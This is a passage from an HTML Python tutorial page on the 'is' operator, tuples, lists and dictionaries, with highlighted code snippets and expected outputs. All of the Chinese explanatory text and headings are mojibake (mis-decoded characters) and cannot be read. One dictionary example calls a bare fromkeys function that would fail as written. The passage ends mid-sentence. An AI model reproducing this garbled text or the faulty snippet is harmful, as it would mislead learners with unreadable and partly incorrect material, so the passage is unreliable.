is</h5><p><span style="font-family:Consolas">is</span> åªæœ‰åœ¨ä¸¤ä¸ªå˜é‡å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡æ—¶ä¼šè¿”å› Trueï¼Œè€Œ <span style="font-family:Consolas">==</span> åˆ™æ˜¯åªè¦å€¼ç›¸åŒå³ä¸ºTrue</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">3.14</span></span><br><span class="line">b = <span class="number">3.14</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#When id(a) != id(b)</span></span><br><span class="line">a <span class="keyword">is</span> b <span class="comment">#it will be False</span></span><br><span class="line">a == b <span class="comment">#it will be True</span></span><br></pre></td></tr></table></figure><h3 id="3-2-å…ƒç»„å’Œåˆ—è¡¨"><a href="#3-2-å…ƒç»„å’Œåˆ—è¡¨" class="headerlink" title="[3.2] å…ƒç»„å’Œåˆ—è¡¨"></a>[3.2] å…ƒç»„å’Œåˆ—è¡¨</h3><h5 id="pre-Î±-å…ƒç»„å’Œåˆ—è¡¨çš„ä¸¤ä¸ªåŒºåˆ«"><a href="#pre-Î±-å…ƒç»„å’Œåˆ—è¡¨çš„ä¸¤ä¸ªåŒºåˆ«" class="headerlink" title="pre.Î±. å…ƒç»„å’Œåˆ—è¡¨çš„ä¸¤ä¸ªåŒºåˆ«"></a>pre.Î±. å…ƒç»„å’Œåˆ—è¡¨çš„ä¸¤ä¸ªåŒºåˆ«</h5><p>åˆ—è¡¨çš„å…ƒç´ å¯ä»¥è¢«é‡æ–°èµ‹å€¼ï¼Œä½†å…ƒç»„ç›¸å½“äºå¸¸é‡ï¼Œä¸èƒ½èµ‹å€¼</p><p>åˆ—è¡¨çš„ä¸¤ç«¯ä½¿ç”¨æ–¹æ‹¬å·è€Œå…ƒç»„çš„ä¸¤ç«¯ä½¿ç”¨åœ†æ‹¬å·</p><h4 id="3-2-3-åŠ æ³•"><a href="#3-2-3-åŠ æ³•" class="headerlink" title="[3.2.3] åŠ æ³•"></a>[3.2.3] åŠ æ³•</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tupleA = (<span class="number">1</span>,<span class="string">&#x27;lemon&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">tupleB = (<span class="number">2</span>,<span class="string">&#x27;lemon&#x27;</span>,<span class="number">3</span>)</span><br><span class="line">listB = [<span class="number">2</span>,<span class="string">&#x27;lemon&#x27;</span>,<span class="number">3</span>]</span><br><span class="line">listA = [<span class="number">1</span>,<span class="string">&#x27;lemon&#x27;</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(listA + listB)   <span class="comment">#this will be [1, &#x27;lemon&#x27;, 2, 2, &#x27;lemon&#x27;, 3]</span></span><br><span class="line"><span class="built_in">print</span>(tupleA + tupleB) <span class="comment">#this will be (1, &#x27;lemon&#x27;, 2, 2, &#x27;lemon&#x27;, 3)</span></span><br></pre></td></tr></table></figure><p><span style="color:blue">&gt;:Specially &gt; å°†åˆ—è¡¨ä¸å…ƒç»„ç›´æ¥ç›¸åŠ ä¼šå¯¼è‡´Â <span style="color:brown">TypeError: can only concatenate list (not â€œtupleâ€) to list</span> çš„é”™è¯¯</span></p><h4 id="3-2-4-ä¹˜æ³•"><a href="#3-2-4-ä¹˜æ³•" class="headerlink" title="[3.2.4] ä¹˜æ³•"></a>[3.2.4] ä¹˜æ³•</h4><p>ä½¿ç”¨ä¹˜æ³•å¯ä»¥å°†ä¸€ä¸ªå…ƒç´ é‡å¤ <span style="font-family:Consolas">n</span> æ¬¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(tupleA + tupleB * <span class="number">3</span>) </span><br><span class="line"><span class="comment">#this will be(1, &#x27;lemon&#x27;, 2, 2, &#x27;lemon&#x27;, 3, 2, &#x27;lemon&#x27;, 3, 2, &#x27;lemon&#x27;, 3)</span></span><br></pre></td></tr></table></figure><h4 id="3-2-5-in"><a href="#3-2-5-in" class="headerlink" title="[3.2.5] in"></a>[3.2.5] in</h4><p>ç”¨ <span style="font-family:Consolas">in</span> æ¥åˆ¤æ–­å…ƒç´ æ˜¯å¦åŒ…æ‹¬åœ¨å…ƒç»„æˆ–åˆ—è¡¨ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;lemon&#x27;</span> <span class="keyword">in</span> listA <span class="comment">#this will be true</span></span><br><span class="line"><span class="string">&#x27;lemon&#x27;</span> <span class="keyword">in</span> tupleA <span class="comment">#this will be true</span></span><br></pre></td></tr></table></figure><h4 id="3-2-6-é•¿åº¦ã€æœ€å¤§å€¼ä¸æœ€å°å€¼"><a href="#3-2-6-é•¿åº¦ã€æœ€å¤§å€¼ä¸æœ€å°å€¼" class="headerlink" title="[3.2.6]é•¿åº¦ã€æœ€å¤§å€¼ä¸æœ€å°å€¼"></a>[3.2.6]é•¿åº¦ã€æœ€å¤§å€¼ä¸æœ€å°å€¼</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(tupleA)) <span class="comment">#this will be 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#When compare the English characters, ASCII will be check sequentially</span></span><br><span class="line">listWord = [<span class="string">&#x27;ab&#x27;</span>,<span class="string">&#x27;ac&#x27;</span>,<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">min</span>(listWord)) <span class="comment">#this will be ab</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(listWord)) <span class="comment">#this will be b</span></span><br></pre></td></tr></table></figure><p><span style="color:blue">&gt;:Specially &gt; ç›´æ¥æ¯”è¾ƒç±»å‹ä¸åŒçš„å…ƒç´ ä¼šå¼•å‘Â <span style="color:brown">TypeError: â€˜&gt;â€™ not supported between instances of â€˜strâ€™ and â€˜intâ€™</span> çš„é”™è¯¯</span></p><h4 id="3-2-7-åºåˆ—çš„å°åŒ…å’Œè§£åŒ…"><a href="#3-2-7-åºåˆ—çš„å°åŒ…å’Œè§£åŒ…" class="headerlink" title="[3.2.7]åºåˆ—çš„å°åŒ…å’Œè§£åŒ…"></a>[3.2.7]åºåˆ—çš„å°åŒ…å’Œè§£åŒ…</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tupleA = <span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>  <span class="comment">#this will automatically convert to a tuple</span></span><br><span class="line">a,b,c,d,e = tupleA       <span class="comment">#make the variables equals the elements in the tuple</span></span><br><span class="line"><span class="built_in">print</span>(a,b,c,d,e)  <span class="comment">#this will be 12 13 14 15 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Unpacking partially is also allowed</span></span><br><span class="line">tupleA = <span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span></span><br><span class="line">f,g,h,*rest = tupleA</span><br><span class="line"><span class="built_in">print</span>(f,g,h,rest) <span class="comment">#this will be 12 13 14 [15, 16]</span></span><br></pre></td></tr></table></figure><h4 id="3-Î±-åˆ—è¡¨çš„ç¥å¥‡æ“ä½œ"><a href="#3-Î±-åˆ—è¡¨çš„ç¥å¥‡æ“ä½œ" class="headerlink" title="[3.Î±] åˆ—è¡¨çš„ç¥å¥‡æ“ä½œ"></a>[3.Î±] åˆ—è¡¨çš„ç¥å¥‡æ“ä½œ</h4><h5 id="Î±-å…ƒç»„è½¬æ¢ä¸ºåˆ—è¡¨ï¼ˆä¸å¯å˜åˆ°å¯å˜ï¼‰"><a href="#Î±-å…ƒç»„è½¬æ¢ä¸ºåˆ—è¡¨ï¼ˆä¸å¯å˜åˆ°å¯å˜ï¼‰" class="headerlink" title="Î±. å…ƒç»„è½¬æ¢ä¸ºåˆ—è¡¨ï¼ˆä¸å¯å˜åˆ°å¯å˜ï¼‰"></a>Î±. å…ƒç»„è½¬æ¢ä¸ºåˆ—è¡¨<span style="color:brown">ï¼ˆä¸å¯å˜åˆ°å¯å˜ï¼‰</span></h5><p>ä½¿ç”¨ <span style="font-family:Consolas">list</span> å‡½æ•°æ¥å°†å…ƒç»„åŒºé—´ç­‰è½¬æ¢æˆåˆ—è¡¨ï¼Œä½†åŒºé—´çš„æ­¥é•¿èµ·ä½œç”¨ç¨å¾®æœ‰ç‚¹ç¥å¥‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tuple_A = (<span class="string">&#x27;Luomos&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">list</span>(tuple_A) <span class="comment">#this will form a list</span></span><br><span class="line"></span><br><span class="line">rangeA = (<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(rangeA)) <span class="comment">#this will be [1,10]</span></span><br><span class="line"></span><br><span class="line">rangeB = (<span class="number">1</span>,<span class="number">10</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(rangeB)) <span class="comment">#this will be [1, 10, 3]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>,<span class="number">3</span>))) <span class="comment">#this will be [1, 4, 7]</span></span><br></pre></td></tr></table></figure><h5 id="Î²-å‘åˆ—è¡¨è¿½åŠ "><a href="#Î²-å‘åˆ—è¡¨è¿½åŠ " class="headerlink" title="Î². å‘åˆ—è¡¨è¿½åŠ "></a>Î². å‘åˆ—è¡¨è¿½åŠ </h5><p>è°ƒç”¨åˆ—è¡¨çš„ <span style="font-family:Consolas">append</span> æ–¹æ³•å¯ä»¥å‘åˆ—è¡¨æœ€åè¿½åŠ å…ƒç´ ï¼Œä½†æ˜¯<strong>æ— è®ºè¿½åŠ ä»€ä¹ˆï¼Œä¸€æ¬¡è¿½åŠ éƒ½åªä¼šå½¢æˆä¸€ä¸ªåµŒå¥—å…ƒç´ </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">listA = [<span class="string">&#x27;Lumos&#x27;</span>]</span><br><span class="line">listA.append(<span class="string">&#x27;Lumos&#x27;</span>)</span><br><span class="line">tupleA = (<span class="string">&#x27;Lumos&#x27;</span>,<span class="string">&#x27;Maximum&#x27;</span>)</span><br><span class="line">listA.append(tupleA)</span><br><span class="line">listA.append(listA) <span class="comment">#it appends itself :)</span></span><br><span class="line"><span class="comment">#Above will eventually form [&#x27;Lumos&#x27;, &#x27;Lumos&#x27;, (&#x27;Lumos&#x27;, &#x27;Maximum&#x27;), [...]]</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæƒ³è¦ä¸€æ¬¡è¿½åŠ å¤šä¸ªå…ƒç´ è€Œä¸è¢«åµŒå¥—ï¼Œä½¿ç”¨ <span style="font-family:Consolas">extend</span> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">listA = [<span class="string">&#x27;Lumos&#x27;</span>]</span><br><span class="line">listA.extend(<span class="string">&#x27;Lumos&#x27;</span>)</span><br><span class="line">tupleA = (<span class="string">&#x27;Lumos&#x27;</span>,<span class="string">&#x27;Maximum&#x27;</span>)</span><br><span class="line">listA.extend(tupleA)</span><br><span class="line">listA.extend(listA) <span class="comment">#it extends itself :)</span></span><br><span class="line"><span class="comment">#Above will eventually form [&#x27;Lumos&#x27;, &#x27;L&#x27;, &#x27;u&#x27;, &#x27;m&#x27;, &#x27;o&#x27;, &#x27;s&#x27;, &#x27;Lumos&#x27;, &#x27;Maximum&#x27;, &#x27;Lumos&#x27;, &#x27;L&#x27;, &#x27;u&#x27;, &#x27;m&#x27;, &#x27;o&#x27;, &#x27;s&#x27;, &#x27;Lumos&#x27;, &#x27;Maximum&#x27;]</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åŒæ—¶ä¹Ÿå¯ä»¥å‘ç°ï¼Œ<strong>å•ä¸ªè¿½åŠ å…ƒç´ æ—¶å…ƒç´ ä¼šè¢«æ‹†å¼€</strong></p><h5 id="Î³-åˆ é™¤åˆ—è¡¨å…ƒç´ "><a href="#Î³-åˆ é™¤åˆ—è¡¨å…ƒç´ " class="headerlink" title="Î³. åˆ é™¤åˆ—è¡¨å…ƒç´ "></a>Î³. åˆ é™¤åˆ—è¡¨å…ƒç´ </h5><h6 id="ã„š-åˆ é™¤åˆ—è¡¨ä¸­çš„å…ƒç´ åˆ‡ç‰‡ï¼ˆindexedï¼‰"><a href="#ã„š-åˆ é™¤åˆ—è¡¨ä¸­çš„å…ƒç´ åˆ‡ç‰‡ï¼ˆindexedï¼‰" class="headerlink" title="ã„š. åˆ é™¤åˆ—è¡¨ä¸­çš„å…ƒç´ åˆ‡ç‰‡ï¼ˆindexedï¼‰"></a>ã„š. åˆ é™¤åˆ—è¡¨ä¸­çš„å…ƒç´ åˆ‡ç‰‡<span style="color:brown">ï¼ˆindexedï¼‰</span></h6><p> ä½¿ç”¨ <span style="font-family:Consolas">del</span> åœ¨åˆ é™¤åˆ—è¡¨ä¸­çš„å…ƒç´ æ—¶å¯ä»¥ä¾ç…§ç´¢å¼•åˆ é™¤ä¸€ä¸ªå…ƒç´ åˆ‡ç‰‡ï¼Œå…¶éµå¾ªæ‰€æœ‰ä¸€èˆ¬åˆ‡ç‰‡çš„è¡¨ç¤ºæ–¹å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listA = [<span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> listA[<span class="number">1</span>:<span class="number">4</span>:<span class="number">2</span>] <span class="comment">#This will form [&#x27;Here&#x27;, &#x27;am&#x27;, &#x27;I&#x27;, &#x27;am&#x27;, &#x27;Here&#x27;, &#x27;I&#x27;, &#x27;am&#x27;]</span></span><br></pre></td></tr></table></figure><p><span style="color:blue">&gt;:Specially &gt; å½“æ²¡æœ‰åˆ‡ç‰‡å±æ€§è€Œå°†åˆ—è¡¨åä¼ é€’ç»™ <span style="font-family:Consolas">del</span> ä¼šä½¿å¾—æ•´ä¸ªåˆ—è¡¨å˜é‡è¢«åˆ é™¤ï¼Œå†æ¬¡è°ƒç”¨è¯¥å˜é‡å°†å¼•å‘Â <span style="color:brown">NameError: name  is not definedÂ </span>çš„é”™è¯¯</span></p><p>å½“éœ€è¦æ¸…ç©ºä¸€ä¸ªåˆ—è¡¨æ—¶ï¼Œæœ€å¥½ä½¿ç”¨ <span style="font-family:Consolas">clear</span> æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listA = [<span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>]</span><br><span class="line">listA.clear() <span class="comment">#This will form []</span></span><br></pre></td></tr></table></figure><h6 id="ã„›-åˆ é™¤æŒ‡å®šå…ƒç´ çš„ç¬¬ä¸€å¤„"><a href="#ã„›-åˆ é™¤æŒ‡å®šå…ƒç´ çš„ç¬¬ä¸€å¤„" class="headerlink" title="ã„›. åˆ é™¤æŒ‡å®šå…ƒç´ çš„ç¬¬ä¸€å¤„"></a>ã„›. åˆ é™¤æŒ‡å®šå…ƒç´ çš„ç¬¬ä¸€å¤„</h6><p>ä½¿ç”¨ <span style="font-family:Consolas">remove</span> æ–¹æ³•å¯ä»¥åˆ é™¤æŒ‡å®šå…ƒç´ çš„é™¤æ­¤å‡ºç°ï¼Œè€Œå…¶åç»­å…¶ä½™å…ƒç´ é¡ºæ¬¡å‰ç§»ä¸€ä¸ªä½ç½®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listA = [<span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>]</span><br><span class="line">listA.remove(<span class="string">&#x27;am&#x27;</span>) <span class="comment">#This will form [&#x27;Here&#x27;, &#x27;I&#x27;, &#x27;Here&#x27;, &#x27;I&#x27;, &#x27;am&#x27;, &#x27;Here&#x27;, &#x27;I&#x27;, &#x27;am&#x27;]</span></span><br></pre></td></tr></table></figure><p><span style="color:blue">&gt;:Specially &gt; å½“æŒ‡å®šçš„å…ƒç´ ä¸å­˜åœ¨æ—¶ï¼Œå°†å¼•å‘ <span style="color:brown">ValueError: list.remove(x): x not in list </span>çš„é”™è¯¯</span></p><h5 id="Î¸-ä¿®æ”¹åˆ—è¡¨å…ƒç´ "><a href="#Î¸-ä¿®æ”¹åˆ—è¡¨å…ƒç´ " class="headerlink" title="Î¸. ä¿®æ”¹åˆ—è¡¨å…ƒç´ "></a>Î¸. ä¿®æ”¹åˆ—è¡¨å…ƒç´ </h5><p>åˆ—è¡¨çš„ä¿®æ”¹å¯ä»¥ç›´æ¥èµ‹å€¼ï¼Œä»ç„¶éµå¾ªå…ƒç´ åˆ‡ç‰‡çš„ä¸€èˆ¬è¡¨è¾¾æ–¹å¼ï¼Œä½†æ˜¯æœ‰ä¸¤ä¸ªç‰¹æ®Šç‚¹</p><h6 id="ã„š-æŒ‡å®šæ­¥é•¿æ—¶å…ƒç´ ä¸ªæ•°å¿…é¡»å¯é¢„æµ‹"><a href="#ã„š-æŒ‡å®šæ­¥é•¿æ—¶å…ƒç´ ä¸ªæ•°å¿…é¡»å¯é¢„æµ‹" class="headerlink" title="ã„š. æŒ‡å®šæ­¥é•¿æ—¶å…ƒç´ ä¸ªæ•°å¿…é¡»å¯é¢„æµ‹"></a>ã„š. æŒ‡å®šæ­¥é•¿æ—¶å…ƒç´ ä¸ªæ•°å¿…é¡»å¯é¢„æµ‹</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listB = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line">listB[<span class="number">0</span>:<span class="number">8</span>:<span class="number">2</span>]=[<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>] <span class="comment">#This will form [5, 2, 5, 4, 5, 6, 5, 8, 9]</span></span><br></pre></td></tr></table></figure><p><span style="color:blue">&gt;:Specially &gt; å…ƒç´ ä¸ªæ•°ä¸å¯é¢„æµ‹æ—¶ï¼Œå°†å¼•å‘ <span style="color:brown">ValueError: attempt to assign sequence of size * to extended slice of size * </span>çš„é”™è¯¯</span></p><h6 id="ã„›-ä½¿ç”¨å­—ç¬¦ä¸²ç›´æ¥èµ‹å€¼æ—¶å­—ç¬¦ä¸²ä¼šè¢«æ‹†è§£"><a href="#ã„›-ä½¿ç”¨å­—ç¬¦ä¸²ç›´æ¥èµ‹å€¼æ—¶å­—ç¬¦ä¸²ä¼šè¢«æ‹†è§£" class="headerlink" title="ã„›. ä½¿ç”¨å­—ç¬¦ä¸²ç›´æ¥èµ‹å€¼æ—¶å­—ç¬¦ä¸²ä¼šè¢«æ‹†è§£"></a>ã„›. ä½¿ç”¨å­—ç¬¦ä¸²ç›´æ¥èµ‹å€¼æ—¶å­—ç¬¦ä¸²ä¼šè¢«æ‹†è§£</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listB = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line">listB[<span class="number">0</span>:<span class="number">2</span>]=<span class="string">&#x27;Hello&#x27;</span> <span class="comment">#This will form [&#x27;H&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, 3, 4, 5, 6, 7, 8, 9]</span></span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²è¢«æ‹†è§£åï¼Œå°†ä»åˆ‡ç‰‡èµ·ç‚¹å¡«å……ç›´åˆ°å­—ç¬¦ä¸²ç»“æŸï¼Œè€Œåˆ‡ç‰‡ç»ˆç‚¹æ— æ•ˆ</p><h5 id="Î´-count-index-reverse-sort"><a href="#Î´-count-index-reverse-sort" class="headerlink" title="Î´. count/index/reverse/sort"></a>Î´. count/index/reverse/sort</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">listB = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line">listB.index(<span class="number">2</span>) <span class="comment">#This will be 1</span></span><br><span class="line"></span><br><span class="line">listB.count(<span class="number">2</span>) <span class="comment">#This will be 1</span></span><br><span class="line"></span><br><span class="line">listB.reverse() <span class="comment">#This will form [9, 8, 7, 6, 5, 4, 3, 2, 1]</span></span><br><span class="line"></span><br><span class="line">listA = [<span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>]</span><br><span class="line">listA.sort(key=<span class="built_in">len</span>,reverse=<span class="literal">True</span>) <span class="comment">#key is the same as cmp in qsort in C</span></span><br><span class="line"><span class="comment">#This will form [&#x27;Here&#x27;, &#x27;Here&#x27;, &#x27;Here&#x27;, &#x27;am&#x27;, &#x27;am&#x27;, &#x27;I&#x27;, &#x27;I&#x27;, &#x27;I&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="3-4-å­—å…¸"><a href="#3-4-å­—å…¸" class="headerlink" title="[3.4] å­—å…¸"></a>[3.4] å­—å…¸</h3><h4 id="3-4-2-åˆ›å»ºå­—å…¸"><a href="#3-4-2-åˆ›å»ºå­—å…¸" class="headerlink" title="[3.4.2] åˆ›å»ºå­—å…¸"></a>[3.4.2] åˆ›å»ºå­—å…¸</h4><p>å­—å…¸çš„åˆ›å»ºæœ‰å¤šç§ç­‰ä»·å†™æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line">dictA = <span class="built_in">dict</span>([(<span class="string">&#x27;A&#x27;</span>,<span class="number">1</span>),(<span class="string">&#x27;B&#x27;</span>,<span class="number">2</span>)])</span><br><span class="line">dictA = <span class="built_in">dict</span>([[<span class="string">&#x27;A&#x27;</span>,<span class="number">1</span>],[<span class="string">&#x27;B&#x27;</span>,<span class="number">2</span>]])</span><br><span class="line">dictA = <span class="built_in">dict</span>(A = <span class="number">1</span>,B = <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–ï¼Œåˆ›å»ºä¸€ä¸ªç©ºå­—å…¸ä¹Ÿæœ‰å¤šç§å†™æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dictB = <span class="built_in">dict</span>()</span><br><span class="line">dictB = &#123;&#125;</span><br></pre></td></tr></table></figure><p>å…ƒç»„ä½œä¸ºä¸€ç§ä¸å¯å˜ç±»å‹çš„ï¼Œä¹Ÿæ˜¯å¯ä»¥ç”¨ä½œkeyçš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dictC = &#123;(<span class="number">1</span>,<span class="number">2</span>):<span class="number">1</span>,<span class="number">2</span>:<span class="number">2</span>,<span class="number">3</span>:<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure><p>ä¸€æ¬¡åˆ›å»ºå¤škeyä½†valueä¸€å®šçš„å­—å…¸</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dictD = fromkeys(&#123;<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>&#125;) <span class="comment">#dictD will be &#123;&#x27;A&#x27;:None,&#x27;B&#x27;:None&#125;</span></span><br><span class="line">dictD = fromkeys((<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>)) <span class="comment">#dictD will be &#123;&#x27;A&#x27;:None,&#x27;B&#x27;:None&#125;</span></span><br><span class="line"></span><br><span class="line">dictD = fromkeys((<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>),<span class="number">2</span>) <span class="comment">#dictD will be &#123;&#x27;A&#x27;:2,&#x27;B&#x27;:2&#125;</span></span><br></pre></td></tr></table></figure><h4 id="3-4-3-å­—å…¸çš„åŸºæœ¬æ“ä½œ"><a href="#3-4-3-å­—å…¸çš„åŸºæœ¬æ“ä½œ" class="headerlink" title="[3.4.3] å­—å…¸çš„åŸºæœ¬æ“ä½œ"></a>[3.4.3] å­—å…¸çš„åŸºæœ¬æ“ä½œ</h4><h5 id="Î±-åˆ é™¤å­—å…¸å…ƒç´ "><a href="#Î±-åˆ é™¤å­—å…¸å…ƒç´ " class="headerlink" title="Î±. åˆ é™¤å­—å…¸å…ƒç´ "></a>Î±. åˆ é™¤å­—å…¸å…ƒç´ </h5><p>ä½¿ç”¨ <span style="font-family:Consolas">del</span> å¯ä»¥åˆ é™¤æŒ‡å®šå…ƒç´ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="keyword">del</span> dictA[<span class="string">&#x27;A&#x27;</span>]</span><br><span class="line"><span class="comment">#dictA will be &#123;&#x27;B&#x27;:2&#125; now</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <span style="font-family:Consolas">clear</span> å¯ä»¥æ¸…ç©ºä¸€ä¸ªå­—å…¸</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line">dictA.clear()</span><br><span class="line"><span class="comment">#dictA will be &#123;&#125; now</span></span><br></pre></td></tr></table></figure><h5 id="Î²-è·å–å­—å…¸å…ƒç´ "><a href="#Î²-è·å–å­—å…¸å…ƒç´ " class="headerlink" title="Î². è·å–å­—å…¸å…ƒç´ "></a>Î². è·å–å­—å…¸å…ƒç´ </h5><p>ä½¿ç”¨ <span style="font-family:Consolas">get</span> 